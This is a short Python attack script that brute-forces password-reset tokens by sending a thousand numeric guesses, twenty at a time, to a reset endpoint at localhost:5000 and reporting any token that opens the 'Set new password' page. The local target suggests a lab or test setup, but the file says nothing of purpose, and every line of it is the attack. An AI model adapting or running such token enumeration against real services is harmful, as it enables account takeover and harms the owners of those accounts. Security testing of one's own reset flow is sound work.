import requests
from concurrent.futures import ThreadPoolExecutor


def main():
    target = "http://localhost:5000/auth/reset-password"

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(check_token, target, guess) for guess in range(100000, 101000)]
        for f in futures:
            result = f.result()
            if result:
                print(f"[+] Found valid token: {result}")
                break


def check_token(target, token):
    with requests.Session() as session:  # thread-safe
        r = session.get(target, params={"token": str(token)})
        if "Set new password" in r.text:
            return token


if __name__ == "__main__":
    main()